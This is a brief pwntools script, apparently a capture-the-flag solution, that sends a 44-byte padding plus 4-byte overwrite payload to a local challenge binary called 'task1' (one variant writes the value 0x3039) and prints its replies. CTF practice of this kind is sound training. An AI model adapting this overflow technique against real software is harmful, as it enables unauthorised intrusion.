from pwn import *

io = process("./task1")
#io = process(["/bin/nc", "ip", "port"])

io.recvline()
io.recvline()
io.recvline()
io.recvline()
io.recvline()
io.recvline()
io.recvline()
io.recvline()
io.recvline()

#io.sendline(b'\x41' * 44 + b'\x39\x30\x00\x00')
io.sendline(b'\x00' * 44 + b'\x00\x00\x00\x00')

hello = io.recvline()
print(hello)
hello = io.recvline()
print(hello)

